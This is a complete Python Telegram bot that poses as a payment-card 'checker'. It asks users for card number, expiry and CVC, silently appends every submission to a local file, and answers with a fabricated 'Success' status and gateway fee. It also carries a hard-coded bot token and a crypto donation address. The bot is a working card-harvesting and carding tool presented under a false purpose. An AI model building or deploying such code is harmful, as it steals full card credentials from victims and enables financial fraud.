import telebot
from telebot import types

TOKEN = "8422396527:AAGqlnCd-1ES2zLtAifQi-kMS_7RdL9wRqI"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        f"Hello, {message.from_user.first_name}! 👋\nChoose what to do:"
    )

    # Menu buttons
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("💳 check number")
    btn2 = types.KeyboardButton("💸 donate")
    btn3 = types.KeyboardButton("❌ close")
    markup.add(btn1, btn2, btn3)

    bot.send_message(message.chat.id, "Select 👇", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    text = message.text.strip()

    # თუ ფორმატი CC|MM|YY|CVC
    parts = text.split("|")
    if len(parts) == 4 and all(part.isdigit() for part in parts):
        total_digits = sum(len(part) for part in parts)
        if 23 <= total_digits <= 28:
            # Save and status
            with open("numbers.txt", "a") as f:
                f.write(text + "\n")
            bot.send_message(message.chat.id, f"Status: Success! Your card : {text} Gateway:2$")
        
    
    elif text == "💸 donate":
        bot.send_message(
            message.chat.id,
            "You can make a donation here (USDT ETH): 0xCb8a3c32f433bD9481E99D2d6c51ef608cf3618a"
        )

    elif text == "❌ close":
        bot.send_message(
            message.chat.id,
            "Menu closed 🙃",
            reply_markup=types.ReplyKeyboardRemove()
        )

    else:
        bot.send_message(message.chat.id, "Type numbers only in format CC|MM|YY|CVC 😉")

print("Bot is running...")
bot.infinity_polling()
